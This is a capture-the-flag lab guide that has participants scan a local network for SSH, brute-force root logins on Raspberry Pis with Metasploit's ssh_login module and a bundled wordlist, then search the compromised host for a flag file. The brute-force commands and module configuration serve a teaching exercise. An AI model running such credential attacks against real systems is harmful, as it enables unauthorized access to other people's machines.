# Capture The Flag With Metasploit

## The Targets

Find raspberry pi's running on the network with port 22 (SSH) open:

```bash
nmap -p 22 --open 192.168.1.0/24
```

## The Brute Force Password Attack

We will use a brute force password attack against the targets we found in the previous step.

### Password List

Viewing our list of passwords that comes with metasploit:

```bash
cat /usr/share/metasploit-framework/data/wordlists/root_userpass.txt
```

### Starting Metasploit

Let's launch the metasploit command shell:

```bash
msfconsole
```

### Loading The SSH Login Attack

msf > `use auxiliary/scanner/ssh/ssh_login`

msf auxiliary(ssh_login) > `show options`


Will output:

```bash

Module options (auxiliary/scanner/ssh/ssh_login):

   Name              Current Setting  Required  Description
   ----              ---------------  --------  -----------
   BLANK_PASSWORDS   false            no        Try blank passwords for all users
   BRUTEFORCE_SPEED  5                yes       How fast to bruteforce, from 0 to 5
   DB_ALL_CREDS      false            no        Try each user/password couple stored in the current database
   DB_ALL_PASS       false            no        Add all passwords in the current database to the list
   DB_ALL_USERS      false            no        Add all users in the current database to the list
   PASSWORD                           no        A specific password to authenticate with
   PASS_FILE                          no        File containing passwords, one per line
   RHOSTS                             yes       The target address range or CIDR identifier
   RPORT             22               yes       The target port
   STOP_ON_SUCCESS   false            yes       Stop guessing when a credential works for a host
   THREADS           1                yes       The number of concurrent threads
   USERNAME                           no        A specific username to authenticate as
   USERPASS_FILE                      no        File containing users and passwords separated by space, one pair per line
   USER_AS_PASS      false            no        Try the username as the password for all users
   USER_FILE                          no        File containing usernames, one per line
   VERBOSE           true             yes       Whether to print output for all attempts
```

### Configuring The Attack
We'll load the file that we created in the previous step with our targets as our "RHOSTS" (Remote Hosts):

msf auxiliary(ssh_login) > `set RHOSTS 192.168.1.1-10`

msf auxiliary(ssh_login) > `set USERPASS_FILE /usr/share/metasploit-framework/data/wordlists/root_userpass.txt`

msf5 auxiliary(scanner/ssh/ssh_login) > `set THREADS 10`

### Running The Attack

msf auxiliary(ssh_login) > `run`

Now exit the metasploit shell:
`exit -y`

If you're successful you will see the output above. Now grab this ip address and login with it via ssh using the password matched:

`ssh root@<the ip address here>`

## Find The Flag

There is a file named "cyber2019flag.txt" somewhere on the file system. Use the find command to locate this file on the file system and then grap the secret code inside and be the first to write it on the dry erase board up front!

Hint:

```bash
find / -name <some filename here>
```
